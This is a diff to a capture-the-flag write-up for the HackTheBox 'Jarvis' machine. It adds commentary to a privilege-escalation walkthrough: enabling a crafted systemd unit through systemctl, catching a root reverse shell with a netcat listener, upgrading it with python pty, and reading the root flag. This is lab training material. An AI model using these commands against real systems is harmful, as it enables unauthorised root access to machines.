@@ -593,24 +593,34 @@ root.service        100%[===================>]     171  --.-KB/s    in 0s
 2023-03-16 02:39:53 (28.9 MB/s) - 'root.service' saved [171/171]
 ```
 
+Then, I copied the file in pepper's directory
 ```
-pepper@jarvis:/tmp$ /bin/systemctl enable /home/pepper/root.service
-/bin/systemctl enable /home/pepper/root.service
-Failed to enable unit: File /home/pepper/root.service: No such file or directory
 pepper@jarvis:/tmp$ cp root.service /home/pepper/
 cp root.service /home/pepper/
 pepper@jarvis:/tmp$ ls /home/pepper
 ls /home/pepper
 Web  root.service  user.txt
-
 ```
 
+Ran the following command from pepper's directory
 ```
 pepper@jarvis:~$ /bin/systemctl enable /home/pepper/root.service
 /bin/systemctl enable /home/pepper/root.service
 Created symlink /etc/systemd/system/multi-user.target.wants/root.service -> /home/pepper/root.service.
 ```
 
+Started a netcat listener.
+```
+nc -lvnp 8881
+```
+
+Then on the target machine, I started the root service
+
+```
+/bin/systemctl start root
+```
+
+Viewing the netcat shell, I got a root shell!!!
 ```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
 └─$ nc -lvnp 8881
@@ -620,6 +630,7 @@ whoami
 root
 ```
 
+Upgrading the shell
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 root@jarvis:/# ls
@@ -630,6 +641,7 @@ dev   initrd.img.old  lost+found  proc  srv   var
 etc   lib             media       root  sys   vmlinuz
 ```
 
+Grabbing the root file.
 ```
 root@jarvis:/# cat root/root.txt
 cat root/root.txt
